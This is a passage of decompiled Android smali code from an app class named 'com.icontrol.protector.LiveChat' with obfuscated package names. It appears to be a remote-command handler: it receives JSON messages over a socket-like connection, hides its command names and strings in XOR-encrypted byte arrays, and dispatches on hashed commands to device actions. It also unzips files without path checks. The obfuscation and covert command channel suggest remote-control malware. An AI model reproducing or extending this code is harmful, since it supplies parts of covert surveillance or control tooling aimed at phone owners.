    invoke-virtual {v1, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->a:Ljava/util/Map;

    invoke-interface {p1, p2}, Ljava/util/Map;->remove(Ljava/lang/Object;)Ljava/lang/Object;

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->b:Ljava/util/Map;

    invoke-interface {p1, p2}, Ljava/util/Map;->remove(Ljava/lang/Object;)Ljava/lang/Object;
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_5

    :goto_2
    :try_start_3
    invoke-virtual {v3}, Ljava/io/FileOutputStream;->close()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    goto :goto_3

    :catchall_1
    move-exception p2

    :try_start_4
    invoke-virtual {p1, p2}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_3
    throw p1
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_0

    :goto_4
    const/16 p2, 0xf

    new-array p2, p2, [B

    fill-array-data p2, :array_4

    new-array v0, v0, [B

    fill-array-data v0, :array_5

    invoke-static {p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :goto_5
    return-void

    :array_0
    .array-data 1
        0x2t
        -0x49t
        0x66t
        0x35t
        -0x70t
        -0x27t
        -0x3t
        -0x4at
        0x26t
        -0x47t
        0x69t
        0x35t
    .end array-data

    :array_1
    .array-data 1
        0x4at
        -0x2at
        0x8t
        0x51t
        -0x4t
        -0x44t
        -0x58t
        -0x3at
    .end array-data

    :array_2
    .array-data 1
        -0x6bt
        0x60t
        -0x48t
        -0x17t
        0x69t
        0x61t
        0x79t
        0x5ft
        -0x44t
        0x67t
        -0x59t
        -0x8t
        0x3bt
        0x66t
        0x7ft
        0x48t
        -0x4at
        0x6dt
        -0x12t
        -0x54t
    .end array-data

    :array_3
    .array-data 1
        -0x2dt
        0x9t
        -0x2ct
        -0x74t
        0x49t
        0x13t
        0x1ct
        0x3ct
    .end array-data

    :array_4
    .array-data 1
        0x30t
        0x28t
        -0x2ft
        0x61t
        0x21t
        -0x2dt
        0x70t
        0x2ft
        0x37t
        0x2et
        -0x3at
        0x48t
        0x26t
        -0x34t
        0x61t
    .end array-data

    :array_5
    .array-data 1
        0x42t
        0x4dt
        -0x4et
        0xet
        0x4ft
        -0x60t
        0x4t
        0x5dt
    .end array-data
.end method


# virtual methods
.method public b(Lntidisestablish/neumonoul/floccinaucinih/m70;ILjava/lang/String;)V
    .locals 0

    .line 1
    invoke-super {p0, p1, p2, p3}, Lntidisestablish/neumonoul/floccinaucinih/o70;->b(Lntidisestablish/neumonoul/floccinaucinih/m70;ILjava/lang/String;)V

    const/4 p1, 0x0

    sput-boolean p1, Lcom/icontrol/protector/LiveChat;->d:Z

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    invoke-static {p1}, Lcom/icontrol/protector/LiveChat;->k(Lcom/icontrol/protector/LiveChat;)V

    return-void
.end method

.method public c(Lntidisestablish/neumonoul/floccinaucinih/m70;Ljava/lang/Throwable;Lntidisestablish/neumonoul/floccinaucinih/dy;)V
    .locals 0

    .line 1
    invoke-super {p0, p1, p2, p3}, Lntidisestablish/neumonoul/floccinaucinih/o70;->c(Lntidisestablish/neumonoul/floccinaucinih/m70;Ljava/lang/Throwable;Lntidisestablish/neumonoul/floccinaucinih/dy;)V

    const/4 p1, 0x0

    sput-boolean p1, Lcom/icontrol/protector/LiveChat;->d:Z

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    invoke-static {p1}, Lcom/icontrol/protector/LiveChat;->k(Lcom/icontrol/protector/LiveChat;)V

    return-void
.end method

.method public d(Lntidisestablish/neumonoul/floccinaucinih/m70;Ljava/lang/String;)V
    .locals 10

    .line 1
    invoke-super {p0, p1, p2}, Lntidisestablish/neumonoul/floccinaucinih/o70;->d(Lntidisestablish/neumonoul/floccinaucinih/m70;Ljava/lang/String;)V

    const/16 p1, 0x13

    new-array v0, p1, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    const/4 v0, 0x4

    const/4 v2, 0x5

    :try_start_0
    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3, p2}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    new-array v4, v0, [B

    fill-array-data v4, :array_2

    new-array v5, v1, [B

    fill-array-data v5, :array_3

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v5, v2, [B

    fill-array-data v5, :array_4

    new-array v6, v1, [B

    fill-array-data v6, :array_5

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v4, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->hashCode()I

    move-result v5

    const/4 v6, 0x2

    const/4 v7, 0x0

    const/4 v8, 0x3

    const/4 v9, 0x1

    sparse-switch v5, :sswitch_data_0

    goto/16 :goto_0

    :sswitch_0
    new-array p1, v2, [B

    fill-array-data p1, :array_6

    new-array v5, v1, [B

    fill-array-data v5, :array_7

    invoke-static {p1, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v4, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    move p1, v2

    goto/16 :goto_1

    :catch_0
    move-exception p1

    goto/16 :goto_3

    :sswitch_1
    new-array p1, v0, [B

    fill-array-data p1, :array_8

    new-array v5, v1, [B

    fill-array-data v5, :array_9

    invoke-static {p1, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v4, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    move p1, v9

    goto :goto_1

    :sswitch_2
    new-array p1, v0, [B

    fill-array-data p1, :array_a

    new-array v5, v1, [B

    fill-array-data v5, :array_b

    invoke-static {p1, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v4, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    move p1, v8

    goto :goto_1

    :sswitch_3
    new-array p1, v8, [B

    fill-array-data p1, :array_c

    new-array v5, v1, [B

    fill-array-data v5, :array_d

    invoke-static {p1, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v4, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    move p1, v7

    goto :goto_1

    :sswitch_4
    const/16 p1, 0x9

    new-array p1, p1, [B

    fill-array-data p1, :array_e

    new-array v5, v1, [B

    fill-array-data v5, :array_f

    invoke-static {p1, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v4, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    move p1, v0

    goto :goto_1

    :sswitch_5
    new-array p1, p1, [B

    fill-array-data p1, :array_10

    new-array v5, v1, [B

    fill-array-data v5, :array_11

    invoke-static {p1, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v4, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    move p1, v6

    goto :goto_1

    :cond_0
    :goto_0
    const/4 p1, -0x1

    :goto_1
    if-eqz p1, :cond_6

    if-eq p1, v9, :cond_5

    if-eq p1, v6, :cond_4

    if-eq p1, v8, :cond_3

    if-eq p1, v0, :cond_2

    if-eq p1, v2, :cond_1

    goto/16 :goto_4

    :cond_1
    invoke-direct {p0, v3}, Lcom/icontrol/protector/LiveChat$a;->k(Lorg/json/JSONObject;)V

    goto/16 :goto_4

    :cond_2
    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {p1}, Lcom/icontrol/protector/WorkServices$d;->l(Landroid/content/Context;)V

    goto/16 :goto_4

    :cond_3
    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    new-array v3, v9, [B

    const/16 v4, -0x60

    aput-byte v4, v3, v7

    new-array v4, v1, [B

    fill-array-data v4, :array_12

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    new-array v4, v0, [B

    fill-array-data v4, :array_13

    new-array v5, v1, [B

    fill-array-data v5, :array_14

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-static {p1, v3, v4}, Lcom/icontrol/protector/LiveChat;->r(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_4

    :cond_4
    new-instance p1, Lntidisestablish/neumonoul/floccinaucinih/pq;

    new-array v3, v2, [B

    fill-array-data v3, :array_15

    new-array v4, v1, [B

    fill-array-data v4, :array_16

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->getBytes()[B

    move-result-object v3

    new-array v4, v2, [B

    fill-array-data v4, :array_17

    new-array v5, v1, [B

    fill-array-data v5, :array_18

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-direct {p1, v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/pq;-><init>([B[B)V

    invoke-static {p1}, Lcom/icontrol/protector/LiveChat;->c(Lntidisestablish/neumonoul/floccinaucinih/pq;)V

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    :goto_2
    invoke-static {p1}, Lcom/icontrol/protector/LiveChat;->k(Lcom/icontrol/protector/LiveChat;)V

    goto/16 :goto_4

    :cond_5
    new-instance p1, Lntidisestablish/neumonoul/floccinaucinih/pq;

    new-array v3, v2, [B

    fill-array-data v3, :array_19

    new-array v4, v1, [B

    fill-array-data v4, :array_1a

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->getBytes()[B

    move-result-object v3

    new-array v4, v0, [B

    fill-array-data v4, :array_1b

    new-array v5, v1, [B

    fill-array-data v5, :array_1c

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->getBytes()[B

    move-result-object v4

    invoke-direct {p1, v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/pq;-><init>([B[B)V

    invoke-static {p1}, Lcom/icontrol/protector/LiveChat;->c(Lntidisestablish/neumonoul/floccinaucinih/pq;)V

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_2

    :cond_6
    :try_start_1
    new-array p1, v2, [B

    fill-array-data p1, :array_1d

    new-array v4, v1, [B

    fill-array-data v4, :array_1e

    invoke-static {p1, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    new-array v4, v2, [B

    fill-array-data v4, :array_1f

    new-array v5, v1, [B

    fill-array-data v5, :array_20

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, p1, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3, p1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-direct {p0, v3}, Lcom/icontrol/protector/LiveChat$a;->q(Lorg/json/JSONObject;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_4

    :catch_1
    move-exception p1

    :try_start_2
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V
    :try_end_2
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_4

    :goto_3
    const/16 v3, 0xd

    new-array v3, v3, [B

    fill-array-data v3, :array_21

    new-array v4, v1, [B

    fill-array-data v4, :array_22

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    invoke-virtual {p2}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object p1

    new-array p2, v0, [B

    fill-array-data p2, :array_23

    new-array v3, v1, [B

    fill-array-data v3, :array_24

    invoke-static {p2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p1, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_7

    new-instance p1, Lntidisestablish/neumonoul/floccinaucinih/pq;

    new-array p2, v2, [B

    fill-array-data p2, :array_25

    new-array v2, v1, [B

    fill-array-data v2, :array_26

    invoke-static {p2, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p2

    invoke-virtual {p2}, Ljava/lang/String;->getBytes()[B

    move-result-object p2

    new-array v0, v0, [B

    fill-array-data v0, :array_27

    new-array v1, v1, [B

    fill-array-data v1, :array_28

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-direct {p1, p2, v0}, Lntidisestablish/neumonoul/floccinaucinih/pq;-><init>([B[B)V

    invoke-static {p1}, Lcom/icontrol/protector/LiveChat;->c(Lntidisestablish/neumonoul/floccinaucinih/pq;)V

    :cond_7
    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    invoke-static {p1}, Lcom/icontrol/protector/LiveChat;->k(Lcom/icontrol/protector/LiveChat;)V

    :goto_4
    return-void

    :sswitch_data_0
    .sparse-switch
        -0x6e93ae10 -> :sswitch_5
        -0x22860cf7 -> :sswitch_4
        0x18181 -> :sswitch_3
        0x31dd2a -> :sswitch_2
        0x360802 -> :sswitch_1
        0x65fca6e -> :sswitch_0
    .end sparse-switch

    :array_0
    .array-data 1
        0x28t
        0x14t
        0x71t
        -0x1dt
        0x29t
        0x3et
        -0x5bt
        0x1dt
        0x22t
        0x5at
        0x70t
        -0x11t
        0x2ct
        0x28t
        -0x79t
        0x12t
        0x26t
        0xet
        0x6t
    .end array-data

    :array_1
    .array-data 1
        0x47t
        0x7at
        0x3ct
        -0x7at
        0x5at
        0x4dt
        -0x3ct
        0x7at
    .end array-data

    :array_2
    .array-data 1
        0x18t
        0x4ct
        -0x65t
        0x3bt
    .end array-data

    :array_3
    .array-data 1
        0x6ct
        0x35t
        -0x15t
        0x5et
        0x6ct
        0x5t
        -0x1at
        -0x3bt
    .end array-data

    :array_4
    .array-data 1
        0x2at
        -0x2t
        0x3bt
        0x33t
        0x61t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x4ft
        -0x6dt
        0x4bt
        0x47t
        0x18t
        0x41t
        -0x33t
        0x5bt
    .end array-data

    :array_6
    .array-data 1
        0x62t
        0x7dt
        -0x1ct
        -0x2ft
        -0x34t
    .end array-data

    nop

    :array_7
    .array-data 1
        0x12t
        0xft
        -0x75t
        -0x57t
        -0x4bt
        0x32t
        0x15t
        0x2dt
    .end array-data

    :array_8
    .array-data 1
        -0x7et
        -0x5t
        -0x4dt
        -0x4et
    .end array-data

    :array_9
    .array-data 1
        -0xft
        -0x71t
        -0x24t
        -0x3et
        0x2ft
        -0x7ct
        -0x5ct
        0x1ct
    .end array-data

    :array_a
    .array-data 1
        0x42t
        -0x35t
        -0x5dt
        0x63t
    .end array-data

    :array_b
    .array-data 1
        0x28t
        -0x5ct
        -0x36t
        0xdt
        0x45t
        -0x21t
        -0x2ft
        0x24t
    .end array-data

    :array_c
    .array-data 1
        -0x5at
        0x48t
        0x11t
    .end array-data

    :array_d
    .array-data 1
        -0x3bt
        0x27t
        0x7ct
        -0x2at
        0x4dt
        -0x3ct
        -0x37t
        0x33t
    .end array-data

    :array_e
    .array-data 1
        0x7at
        0x56t
        -0x5dt
        -0x1t
        -0x4et
        0x38t
        -0x15t
        -0x4t
        0x7dt
    .end array-data

    nop

    :array_f
    .array-data 1
        0x19t
        0x39t
        -0x33t
        -0x6ft
        -0x29t
        0x5bt
        -0x61t
        -0x67t
    .end array-data

    :array_10
    .array-data 1
        -0x7t
        -0x34t
        -0x2at
        0x42t
        0x20t
        0x49t
        -0x6t
        -0x51t
        -0x3bt
        -0x28t
        -0x2et
        0x53t
        0x74t
        0x40t
        -0xat
        -0x42t
        -0x37t
        -0x2ft
        -0x3ct
    .end array-data

    :array_11
    .array-data 1
        -0x54t
        -0x5et
        -0x49t
        0x37t
        0x54t
        0x21t
        -0x6bt
        -0x23t
    .end array-data

    :array_12
    .array-data 1
        -0x70t
        0x25t
        0x6ct
        0x37t
        0x13t
        -0x5bt
        0xdt
        -0x5at
    .end array-data

    :array_13
    .array-data 1
        0x32t
        0x4ct
        0xdt
        0x5t
    .end array-data

    :array_14
    .array-data 1
        0x58t
        0x23t
        0x64t
        0x6bt
        -0x30t
        -0x78t
        0x14t
        -0x67t
    .end array-data

    :array_15
    .array-data 1
        0x46t
        0x3bt
        0x3dt
        0x52t
        -0x47t
    .end array-data

    nop

    :array_16
    .array-data 1
        0x15t
        0x57t
        0x58t
        0x37t
        -0x37t
        -0x2et
        0x3bt
        0x6dt
    .end array-data

    :array_17
    .array-data 1
        0x5t
        -0x5t
        -0xct
        0x75t
        0x6t
    .end array-data

    nop

    :array_18
    .array-data 1
        0x6bt
        -0x72t
        -0x68t
        0x19t
        0x36t
        -0x76t
        0x54t
        -0x7ct
    .end array-data

    :array_19
    .array-data 1
        0x42t
        -0x4ft
        -0x64t
        -0x2et
        -0x63t
    .end array-data

    nop

    :array_1a
    .array-data 1
        0x11t
        -0x23t
        -0x7t
        -0x49t
        -0x13t
        0x74t
        0x6ft
        -0x77t
    .end array-data

    :array_1b
    .array-data 1
        0x63t
        0x73t
        0xft
        -0x57t
    .end array-data

    :array_1c
    .array-data 1
        0xdt
        0x6t
        0x63t
        -0x3bt
        -0x57t
        0x25t
        -0x77t
        -0x1ct
    .end array-data

    :array_1d
    .array-data 1
        0x3bt
        0x77t
        -0x7dt
        0x41t
        0x45t
    .end array-data

    nop

    :array_1e
    .array-data 1
        0x4bt
        0x13t
        -0x1et
        0x35t
        0x24t
        0x58t
        -0x3et
        0x74t
    .end array-data

    :array_1f
    .array-data 1
        0x1t
        -0xdt
        0x62t
        0x5ft
        -0x54t
    .end array-data

    nop

    :array_20
    .array-data 1
        0x64t
        -0x62t
        0x12t
        0x2bt
        -0x2bt
        -0x1at
        -0x6bt
        -0x44t
    .end array-data

    :array_21
    .array-data 1
        0x1t
        -0x24t
        -0x5ct
        -0x44t
        0x7ft
        -0x28t
        0x24t
        -0x41t
        0xet
        -0x34t
        -0x5dt
        -0x4dt
        0x2bt
    .end array-data

    nop

    :array_22
    .array-data 1
        0x6bt
        -0x51t
        -0x35t
        -0x2et
        0x5ft
        -0x4ct
        0x4dt
        -0x37t
    .end array-data

    :array_23
    .array-data 1
        -0x47t
        -0x57t
        -0x2at
        0x6ft
    .end array-data

    :array_24
    .array-data 1
        -0x36t
        -0x23t
        -0x47t
        0x1ft
        -0x5t
        0x1at
        0x2at
        -0x54t
    .end array-data

    :array_25
    .array-data 1
        -0x13t
        -0x5dt
        -0x7dt
        -0x5ct
        -0x2ct
    .end array-data

    nop

    :array_26
    .array-data 1
        -0x42t
        -0x31t
        -0x1at
        -0x3ft
        -0x5ct
        -0x52t
        -0x6et
        -0x2dt
    .end array-data

    :array_27
    .array-data 1
        -0x67t
        -0x37t
        -0x5t
        -0x62t
    .end array-data

    :array_28
    .array-data 1
        -0x9t
        -0x44t
        -0x69t
        -0xet
        -0x12t
        0x7at
        -0x61t
        -0x1bt
    .end array-data
.end method

.method public f(Lntidisestablish/neumonoul/floccinaucinih/m70;Lntidisestablish/neumonoul/floccinaucinih/dy;)V
    .locals 2

    .line 1
    const/4 p1, 0x1

    :try_start_0
    sput-boolean p1, Lcom/icontrol/protector/LiveChat;->d:Z

    iget-object p2, p0, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    invoke-virtual {p2}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->E:Ljava/lang/String;

    sget-object v1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    invoke-static {p2, v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/sq;->f(Landroid/content/Context;Ljava/lang/String;Ljava/lang/Boolean;)V

    iget-object p2, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    new-array p1, p1, [B

    const/4 v0, 0x0

    const/16 v1, 0x33

    aput-byte v1, p1, v0

    const/16 v0, 0x8

    new-array v1, v0, [B

    fill-array-data v1, :array_0

    invoke-static {p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object p1

    const/4 v1, 0x4

    new-array v1, v1, [B

    fill-array-data v1, :array_1

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {p2, p1, v0}, Lcom/icontrol/protector/LiveChat;->r(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void

    nop

    :array_0
    .array-data 1
        0x3t
        -0x17t
        -0x5t
        -0x2ft
        -0xet
        0x25t
        0xbt
        0x60t
    .end array-data

    :array_1
    .array-data 1
        -0x1dt
        -0x9t
        -0x59t
        0x7dt
    .end array-data

    :array_2
    .array-data 1
        -0x77t
        -0x68t
        -0x32t
        0x13t
        0x72t
        0x4et
        -0x50t
        0x51t
    .end array-data
.end method

.method public v(Ljava/io/File;Ljava/io/File;)V
    .locals 5

    .line 1
    :try_start_0
    new-instance v0, Ljava/io/FileInputStream;

    invoke-direct {v0, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    :try_start_1
    new-instance p1, Ljava/util/zip/ZipInputStream;

    invoke-direct {p1, v0}, Ljava/util/zip/ZipInputStream;-><init>(Ljava/io/InputStream;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_3

    :goto_0
    :try_start_2
    invoke-virtual {p1}, Ljava/util/zip/ZipInputStream;->getNextEntry()Ljava/util/zip/ZipEntry;

    move-result-object v1

    if-eqz v1, :cond_2

    new-instance v2, Ljava/io/File;

    invoke-virtual {v1}, Ljava/util/zip/ZipEntry;->getName()Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, p2, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-virtual {v1}, Ljava/util/zip/ZipEntry;->isDirectory()Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-virtual {v2}, Ljava/io/File;->mkdirs()Z

    goto :goto_2

    :catchall_0
    move-exception p2

    goto :goto_5

    :cond_0
    new-instance v1, Ljava/io/FileOutputStream;

    invoke-direct {v1, v2}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    const/16 v2, 0x400

    :try_start_3
    new-array v2, v2, [B

    :goto_1
    invoke-virtual {p1, v2}, Ljava/io/InputStream;->read([B)I

    move-result v3

    if-lez v3, :cond_1

    const/4 v4, 0x0

    invoke-virtual {v1, v2, v4, v3}, Ljava/io/FileOutputStream;->write([BII)V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    goto :goto_1

    :catchall_1
    move-exception p2

    goto :goto_3

    :cond_1
    :try_start_4
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V

    :goto_2
    invoke-virtual {p1}, Ljava/util/zip/ZipInputStream;->closeEntry()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    goto :goto_0

    :goto_3
    :try_start_5
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_2

    goto :goto_4

    :catchall_2
    move-exception v1

    :try_start_6
    invoke-virtual {p2, v1}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_4
    throw p2
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    :cond_2
    :try_start_7
    invoke-virtual {p1}, Ljava/util/zip/ZipInputStream;->close()V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_3

    :try_start_8
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_8
    .catch Ljava/io/IOException; {:try_start_8 .. :try_end_8} :catch_0

    goto :goto_a

    :catch_0
    move-exception p1

    goto :goto_9

    :catchall_3
    move-exception p1

    goto :goto_7

    :goto_5
    :try_start_9
    invoke-virtual {p1}, Ljava/util/zip/ZipInputStream;->close()V
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_4

    goto :goto_6

    :catchall_4
    move-exception p1

    :try_start_a
    invoke-virtual {p2, p1}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_6
    throw p2
    :try_end_a
    .catchall {:try_start_a .. :try_end_a} :catchall_3

    :goto_7
    :try_start_b
    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_5

    goto :goto_8

    :catchall_5
    move-exception p2

    :try_start_c
    invoke-virtual {p1, p2}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    :goto_8
    throw p1
    :try_end_c
    .catch Ljava/io/IOException; {:try_start_c .. :try_end_c} :catch_0

    :goto_9
    invoke-virtual {p1}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_a
    return-void
.end method

.method public x(Landroid/content/Context;Ljava/lang/String;)V
    .locals 10

    .line 1
    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->W:Ljava/lang/String;

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/sq;->d(Landroid/content/Context;Ljava/lang/String;)Ljava/util/ArrayList;

    move-result-object v0

    const-string v1, ""

    const/4 v2, 0x3

    const/4 v3, 0x1

    const/4 v4, 0x0

    const/4 v5, 0x4

    const/16 v6, 0x8

    if-eqz v0, :cond_1

    invoke-virtual {v0}, Ljava/util/ArrayList;->size()I

    move-result v7

    if-lez v7, :cond_1

    invoke-virtual {v0}, Ljava/util/ArrayList;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :goto_0
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v7, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Lntidisestablish/neumonoul/floccinaucinih/ab;->i:Ljava/lang/String;

    invoke-virtual {v7, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    goto :goto_0

    :cond_0
    :try_start_0
    new-instance p1, Lorg/json/JSONObject;

    invoke-direct {p1}, Lorg/json/JSONObject;-><init>()V

    new-array v0, v5, [B

